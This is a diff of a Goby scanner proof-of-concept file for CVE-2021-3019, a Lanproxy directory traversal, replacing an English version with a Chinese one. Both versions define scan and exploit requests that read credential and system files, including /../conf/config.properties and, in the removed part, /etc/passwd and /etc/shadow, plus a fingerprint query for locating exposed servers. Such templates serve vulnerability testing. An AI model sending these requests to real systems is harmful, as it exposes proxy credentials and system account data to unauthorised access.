@@ -1,44 +1,36 @@
 {
-      "Name": "Lanproxy Directory Traversal CVE-2021-3019",
+      "Name": "Lanproxy目录遍历 CVE-2021-3019",
       "Level": "2",
-      "Tags": [
-            "Directory Traversal"
-      ],
-      "GobyQuery": "header=\"Server: LPS-0.1\"",
-      "Description": "Lanproxy is a reverse proxy to help you expose a local server behind a NAT or firewall to the internet. it supports any protocols over tcp (http https ssh ...)",
-      "Product": "ffay lanproxy 0.1",
-      "Homepage": "https://github.com/ffay/lanproxy",
-      "Author": "",
-      "Impact": "ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties to obtain credentials for a connection to the intranet.",
-      "Recommendation": "",
+      "Tags": [],
+      "GobyQuery": "header= \"Server: LPS-0.1\"",
+      "Description": "lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，目前仅支持tcp流量转发，可支持任何tcp上层协议（ssh访问、web服务器访问、远程桌面...）。",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
       "References": [
-            "https://github.com/ffay/lanproxy/commits/master",
-            "https://github.com/maybe-why-not/lanproxy/issues/1",
-            "https://nvd.nist.gov/vuln/detail/CVE-2021-3019"
+            "https://gobies.org/"
       ],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "Filename",
-                  "Type": "select",
-                  "Value": "/../../../../../../../../../../etc/passwd,/../conf/config.properties,/../../../../../../../../../../etc/shadow"
-            }
-      ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "path",
+			"type": "input",
+			"value": "/../conf/config.properties",
+			"show": ""
+		}
+	  ],
       "ScanSteps": [
             "AND",
             {
                   "Request": {
                         "method": "GET",
                         "uri": "/../conf/config.properties",
-                        "follow_redirect": true,
-                        "header": null,
+                        "follow_redirect": false,
+                        "header": {},
                         "data_type": "text",
-                        "data": "",
-                        "set_variable": []
+                        "data": ""
                   },
                   "ResponseTest": {
                         "type": "group",
@@ -55,7 +47,34 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "server.ssl",
+                                    "value": "config.admin",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{path}}}",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
                                     "bz": ""
                               },
                               {
@@ -68,40 +87,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
+					"output|lastbody"
+				  ]
             }
       ],
-      "ExploitSteps": [
-            "AND",
-            {
-                  "Request": {
-                        "method": "GET",
-                        "uri": "{{{Filename}}}",
-                        "follow_redirect": true,
-                        "header": null,
-                        "data_type": "text",
-                        "data": "",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
-            }
-      ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-06-24 17:23:13",
+      "GobyVersion": "1.8.268"
 }
